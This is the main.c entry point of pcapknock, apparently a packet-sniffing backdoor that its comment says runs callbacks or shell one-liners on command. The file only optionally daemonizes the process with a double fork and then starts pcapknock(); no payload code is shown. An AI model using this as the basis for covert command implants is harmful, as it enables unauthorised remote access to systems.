/*
 * main.c
 * Entrypoint to pcapknock as a program
 * By J. Stuart McMurray
 * Created 20190322
 * Last Modified 20190322
 */

#include <pthread.h>

#include "doublefork.h"
#include "pcapknock.h"

/* pcapknock sniffs packets and listens for commands to execute callbacks or
 * short shell one-liners */
int
main(void)
{
        int ret;
#ifdef DAEMON
        switch (ret = doublefork()) {
                case 0: /* Child */
                        break;
                case 1: /* Parent */
                        return 0;
                default: /* Error */
                        return ret;
        }
#endif /* #ifdef DAEMON */

        /* Start pcapknock and end the main thread */
        if (0 != (ret = pcapknock()))
                return ret;
        pthread_exit(NULL);
}
